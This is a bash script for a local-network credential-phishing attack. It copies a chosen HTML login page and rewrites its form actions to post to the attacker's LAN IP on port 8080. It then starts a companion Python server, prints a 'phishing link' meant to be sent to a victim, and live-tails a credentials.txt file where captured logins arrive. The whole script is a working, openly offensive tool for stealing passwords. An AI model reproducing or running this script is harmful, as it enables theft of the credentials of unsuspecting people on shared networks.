#!/bin/bash

HTML_DIR="."

# ─── Step 1: Get attacker's LAN IP automatically ─────────────────────────────
ATTACKER_IP=$(hostname -I | awk '{print $1}')

if [ -z "$ATTACKER_IP" ]; then
  echo "[-] Could not detect LAN IP. Are you connected to a network?"
  exit 1
fi

echo ""
echo "==============================="
echo "   SELECT A LOGIN PAGE"
echo "==============================="

# ─── Step 2: Find all HTML files ─────────────────────────────────────────────
HTML_FILES=()
while IFS= read -r -d '' file; do
  HTML_FILES+=("$file")
done < <(find "$HTML_DIR" -maxdepth 1 -name "*.html" -print0 | sort -z)

if [ ${#HTML_FILES[@]} -eq 0 ]; then
  echo "[-] No HTML files found"
  exit 1
fi

for i in "${!HTML_FILES[@]}"; do
  echo "  [$((i+1))] ${HTML_FILES[$i]}"
done

echo ""
read -p "Enter number (1-${#HTML_FILES[@]}): " CHOICE

if ! [[ "$CHOICE" =~ ^[0-9]+$ ]] || \
   [ "$CHOICE" -lt 1 ] || \
   [ "$CHOICE" -gt "${#HTML_FILES[@]}" ]; then
  echo "[-] Invalid choice. Exiting."
  exit 1
fi

SELECTED="${HTML_FILES[$((CHOICE-1))]}"

echo ""
echo "[+] Selected: $SELECTED"

# ─── Step 3: Copy selected page and update form action to attacker's LAN IP ──
cp "$SELECTED" login.html

sed -i "s|action=\"[^\"]*\"|action=\"http://$ATTACKER_IP:8080/login\"|gi" login.html
sed -i "s|action='[^']*'|action='http://$ATTACKER_IP:8080/login'|gi" login.html

echo "[+] Form action set to http://$ATTACKER_IP:8080/login"

# ─── Step 4: Start server automatically if not already running ───────────────
if ! curl -s --max-time 2 http://$ATTACKER_IP:8080 > /dev/null; then
  echo "[*] Server not running. Starting it now..."
  python3 server.py "$ATTACKER_IP" &
  SERVER_PID=$!
  sleep 2

  # Confirm server started successfully
  if ! curl -s --max-time 2 http://$ATTACKER_IP:8080 > /dev/null; then
    echo "[-] Failed to start server. Check python3 is installed."
    exit 1
  fi
  echo "[+] Server started (PID: $SERVER_PID)"
else
  echo "[+] Server already running"
fi

# ─── Step 5: Display phishing link for attacker to send ──────────────────────
echo ""
echo "======================================================="
echo "   PHISHING LINK — Send this to the victim:"
echo ""
echo "   http://$ATTACKER_IP:8080"
echo ""
echo "   (Both machines must be on the same Wi-Fi network)"
echo "======================================================="
echo ""

# ─── Step 6: Open browser on attacker machine (optional) ─────────────────────
xdg-open http://$ATTACKER_IP:8080 2>/dev/null

echo "==============================="
echo " Watch THIS terminal for"
echo " captured credentials!"
echo "==============================="
echo ""

# ─── Step 7: Live-tail the credentials file ──────────────────────────────────
echo "[*] Waiting for submissions... (Ctrl+C to stop)"
touch credentials.txt
tail -f credentials.txt
